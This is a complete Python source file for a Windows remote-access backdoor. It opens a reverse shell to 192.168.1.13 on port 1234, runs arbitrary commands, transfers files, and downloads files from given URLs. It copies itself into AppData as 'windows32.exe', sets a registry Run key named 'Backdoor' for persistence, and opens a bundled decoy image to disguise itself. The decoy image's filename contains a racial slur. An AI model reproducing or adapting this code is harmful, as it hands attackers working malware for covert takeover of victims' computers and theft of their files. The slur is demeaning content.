#!/usr/bin/python

import socket
import json
import subprocess
import os
import sys
import time
import base64
import shutil
import requests
import winreg

# Main server
def server(ip, port):
    global conn
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            conn.connect((ip, port))
            break
        except ConnectionRefusedError:
            time.sleep(10) 
            
# Admin privs
def is_admin():
    global admin
    
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\\windows'),'temp']))
    except:
        admin = "[!!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges!"
            

            
# google.com/release/downloads/python.exe      --> python.exe
def download(url):
    get_respone = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_respone.content)
            
# Send function for the reverse_shell to Server   
def send(data):
    try:
        json_data = json.dumps(data)
        conn.send(json_data.encode('utf-8'))
    except Exception as e:
        pass

# recevice function for the reverse_shell to recevice from Server  
def receive():
    json_data = ''
    while True:
        try:
            json_data += conn.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue
        except Exception as e:
            break


def run():
    while True:
        try:
            command = receive()
            # print(command) # for Debugging
            if command == 'exit':
                break
            elif command == 'client_help':
                help_options = '''
                                download [file_name] --> Download a File From Target PC
                                upload   [file_name] --> Upload a File To Target PC
                                get      [url]       --> Download File from URL
                                check                --> Check Admin Privileges
                                start    [program]   --> Start Program
                                cd       [directory] --> Change Directory'''
                send(help_options)
                
            elif command[:2] == 'cd' and len(command) > 1:
                try:
                    os.chdir(command[3:].strip())
                    result = f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    result = f"cd error: {e}"
                    
            elif command[:8] == 'download':
                try:
                    with open(command[9:], 'rb') as f:
                        send(base64.b64encode(f.read()).decode('utf-8'))
                except Exception as e:
                    send(f"Download error: {e}")
                    
            elif command[:6] == 'upload':
                try:
                    with open(command[7:], 'wb') as f:
                        file_data = receive()
                        f.write(base64.b64decode(file_data))
                except Exception as e:
                    send(f"Upload error: {e}")
                    
            elif command[:3] == 'get':
                try:
                    download(command[4:])
                    send("[+] Downloaded File from Specified URL!")
                except:
                    send("[!!] Failed to Downloaded File from Specified URL!")
                    
            elif command[:5] == 'check':
                try:
                    is_admin()
                    send(admin)
                except:
                    send("[-] Can't Perform admin check")
                    
            elif command[:5] == 'start':
                try:
                    subprocess.Popen(command[6:], shell=True)
                    send("[+] Started")
                except:
                    send("[-] Failed to Start")
                                    
            else:
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                result = process.stdout.read() + process.stderr.read()
            send(result)
        except Exception as e:
            pass


location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    try:
        shutil.copyfile(sys.executable, location)
    except Exception as e:
        pass

# Always try to add registry entry
try:
    reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    winreg.SetValueEx(reg_key, "Backdoor", 0, winreg.REG_SZ, location)
    winreg.CloseKey(reg_key)
    
    # Check if image has been opened before
    flag_file = os.environ["appdata"] + "\\img_opened.flag"
    if not os.path.exists(flag_file):
        file_name = sys._MEIPASS + "\\Nigger_city.jpg"
        try:
            subprocess.Popen(file_name, shell=True)
            # Create flag file to indicate image has been opened
            with open(flag_file, 'w') as f:
                f.write("1")
        except:
            pass
    
except Exception as e:
    pass

server('192.168.1.13', 1234)
run()